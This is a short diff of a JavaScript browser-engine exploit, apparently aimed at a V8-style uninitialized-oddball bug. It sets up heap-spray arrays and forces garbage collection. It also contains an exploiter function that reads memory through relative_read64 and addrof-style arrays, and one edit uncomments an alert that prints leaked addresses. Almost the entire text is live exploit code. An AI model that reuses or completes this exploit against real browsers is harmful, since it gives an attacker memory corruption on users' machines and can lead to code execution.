@@ -15,11 +15,11 @@ function major_gc() {
 // Line ~400+ is to trigger the bug, anything before that is for the exploit
 
 let corrupted_array = new Array(1367);
-corrupted_array.fill(1.1);
+corrupted_array.fill(-1.1);
 major_gc();
 major_gc();
 let rw_array = new Array(10000);
-rw_array.fill(1.1);
+rw_array.fill(-88.99);
 let addrof_array = new Array(1338);
 
 class Helpers {
@@ -240,7 +240,7 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
             let value = relative_read64(i);
             helpers.set_i64(value);
             var [hi, lo] = helpers.get_u32_pair();
-            // alert(hex(hi)+hex(lo));
+            alert(hex(hi)+hex(lo));
             // alert(hex(lo));
             if (hi == 2734n || lo == 2734n) {
                 let prev2 = relative_read64(i - 2);
